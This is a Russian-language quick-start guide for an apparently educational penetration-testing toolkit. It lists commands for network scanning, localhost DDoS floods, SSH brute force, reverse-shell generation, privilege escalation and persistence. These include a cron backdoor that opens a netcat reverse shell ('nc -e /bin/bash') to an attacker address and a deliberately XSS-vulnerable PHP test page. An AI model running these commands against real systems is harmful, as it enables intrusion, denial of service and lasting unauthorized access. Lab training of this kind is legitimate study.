# 🚀 Быстрый старт - Образовательные инструменты кибербезопасности

## ✅ Установка завершена!

Все зависимости установлены в виртуальном окружении. Теперь вы можете использовать инструменты для изучения кибербезопасности.

## 🔧 Активация окружения

Перед каждым использованием активируйте виртуальное окружение:

```bash
cd /Users/phenix/Projects/pen_test
source venv/bin/activate
```

## 🎯 Быстрые команды для тестирования

### 1. Сканирование сети
```bash
# Поиск живых хостов в локальной сети
python3 network_scanner.py 192.168.1.0/24 --ping

# Полное сканирование с поиском уязвимостей
python3 network_scanner.py 192.168.1.0/24 --all
```

### 2. DDoS тестирование (только localhost!)
```bash
# HTTP Flood на 10 секунд
python3 ddos_educational.py 127.0.0.1 -t http -d 10

# TCP SYN Flood
python3 ddos_educational.py 127.0.0.1 -t tcp -d 10

# Slowloris атака
python3 ddos_educational.py 127.0.0.1 -t slowloris -d 30
```

### 3. Инструменты эксплуатации
```bash
# Поиск скрытых веб-директорий
python3 exploitation_tools.py 127.0.0.1 --web-dirs --port 80

# SSH brute force (если есть SSH сервер)
python3 exploitation_tools.py 192.168.1.100 --ssh-brute

# Генерация reverse shell
python3 exploitation_tools.py 192.168.1.100 --reverse-shell 192.168.1.50 4444
```

### 4. Полное тестирование на проникновение
```bash
# Полный цикл тестирования
python3 full_penetration_test.py 192.168.1.0/24 --target 192.168.1.100

# Отдельные фазы
python3 full_penetration_test.py 192.168.1.0/24 --phase 1  # Разведка
python3 full_penetration_test.py 192.168.1.0/24 --phase 2  # Сканирование
python3 full_penetration_test.py 192.168.1.0/24 --target 192.168.1.100 --phase 3  # Эксплуатация
```

### 5. Повышение привилегий
```bash
# Сканирование на повышение привилегий
python3 privilege_escalation.py --all

# Отдельные проверки
python3 privilege_escalation.py --sudo
python3 privilege_escalation.py --suid
```

### 6. Поддержание доступа
```bash
# Анализ методов persistence
python3 persistence_toolkit.py --report

# Создание SSH бэкдора
python3 persistence_toolkit.py --ssh-key "ssh-rsa AAAAB3NzaC1yc2E..."

# Cron бэкдор
python3 persistence_toolkit.py --cron "nc -e /bin/bash 192.168.1.50 4444" "*/10 * * * *"
```

## 🎓 Образовательные сценарии

### Сценарий 1: Полное тестирование локальной сети
```bash
# 1. Активируем окружение
source venv/bin/activate

# 2. Сканируем сеть
python3 network_scanner.py 192.168.1.0/24 --all

# 3. Выбираем цель и тестируем
python3 full_penetration_test.py 192.168.1.0/24 --target 192.168.1.100
```

### Сценарий 2: DDoS тестирование
```bash
# 1. Запускаем простой веб-сервер (в другом терминале)
python3 -m http.server 8080

# 2. Тестируем DDoS атаки
python3 ddos_educational.py 127.0.0.1 -t http -p 8080 -d 30
```

### Сценарий 3: Веб-уязвимости
```bash
# 1. Создаем уязвимую веб-страницу
echo '<?php echo "Hello " . $_GET["name"]; ?>' > test.php
python3 -m http.server 8080

# 2. Тестируем XSS
python3 exploitation_tools.py 127.0.0.1 --xss-test "http://127.0.0.1:8080/test.php"
```

## ⚠️ Важные напоминания

1. **Всегда активируйте виртуальное окружение** перед использованием
2. **Используйте только локальные адреса** (127.x.x.x, 192.168.x.x, 10.x.x.x)
3. **Тестируйте только на собственных системах** или с письменного разрешения
4. **Изучайте для защиты**, а не для атак

## 🛠️ Устранение проблем

### Если возникают ошибки импорта:
```bash
# Убедитесь, что виртуальное окружение активировано
source venv/bin/activate

# Проверьте установленные пакеты
pip list | grep scapy
```

### Если нужны дополнительные зависимости:
```bash
# Установка дополнительных пакетов
pip install package_name
```

## 📚 Дополнительные ресурсы

- **README.md** - Полная документация
- **requirements.txt** - Список зависимостей
- **setup_lab.sh** - Автоматическая настройка лаборатории

## 🎯 Следующие шаги

1. Изучите код каждого инструмента
2. Экспериментируйте с различными параметрами
3. Создайте собственную лабораторную среду
4. Изучите методы защиты от каждого типа атак
5. Практикуйтесь на специальных уязвимых системах (DVWA, Metasploitable)

**Удачного изучения кибербезопасности! 🛡️**
